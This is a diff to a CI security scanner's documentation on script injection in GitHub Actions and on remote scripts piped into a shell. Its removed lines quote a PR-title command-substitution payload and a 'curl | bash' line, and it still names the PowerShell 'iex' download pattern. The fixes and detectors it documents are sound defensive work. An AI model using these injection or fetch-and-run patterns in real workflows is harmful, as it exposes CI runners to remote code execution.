@@ -141,7 +141,7 @@ The `yaml-run-injection` detector walks `jobs.*.steps.*.run` and only fires when
 **Fix recipe**: Move the value out of `${{ }}` into an `env:` var, then reference the env var from the shell — shell quoting now applies and command substitution doesn't fire:
 
 ```yaml
-# WRONG — RCE if the PR title is `$(curl https://example.invalid/x | sh)`
+# WRONG — RCE if the PR title is a command substitution that fetches and runs a script
 - run: echo "Building PR ${{ github.event.pull_request.title }}"
 
 # RIGHT — the env var is bash-quoted, no expression substitution
@@ -594,20 +594,26 @@ title_template: "Unverified remote script execution in {basename}"
 - `deno run … https://…` (deno executes remote URLs directly)
 
 ```yaml
-# WRONG — runs whatever get.example.com serves right now
-- run: curl -fsSL https://get.example.com/install.sh | bash
+# WRONG — runs whatever the installer host serves at this moment
+- run: curl -fsSL "<installer-url>" | bash
 ```
+
+(`<installer-url>` stands in for the vendor address a real workflow writes
+inline. For the `curl`/`wget` forms the detector matches either way, because
+what makes those unsafe is the pipe into a shell, not the address being
+fetched; the `deno run` form is the exception — it has no pipe, so that arm
+does key on a literal URL.)
 
 PowerShell `iex (New-Object Net.WebClient).DownloadString(...)` is the same class on Windows runners but is not matched here (casing / Windows-runner rarity); flag it in manual review if you run Windows jobs.
 
-**Severity**: MEDIUM. Real RCE vector, but it depends on the remote host being (or becoming) malicious — a live condition rather than an in-repo defect. A SHA-pinned raw URL (`raw.githubusercontent.com/owner/repo/<sha>/install.sh`) materially reduces the risk; the detector still flags it, so treat a pinned-URL hit as low-priority.
+**Severity**: MEDIUM. Real RCE vector, but it depends on the remote host being (or becoming) malicious — a live condition rather than an in-repo defect. A SHA-pinned raw URL (`raw.githubusercontent.com/owner/repo/<sha>/…`) materially reduces the risk; the detector still flags it, so treat a pinned-URL hit as low-priority.
 
 **Fix recipe**: Download, verify, then execute as separate steps — pin the expected content by checksum:
 
 ```yaml
 # RIGHT — fetch, verify a known-good digest, then run
 - run: |
-    curl -fsSL -o install.sh https://get.example.com/install.sh
+    curl -fsSL -o install.sh "<installer-url>"
     echo "<known-sha256>  install.sh" | sha256sum -c -
     bash install.sh
 ```
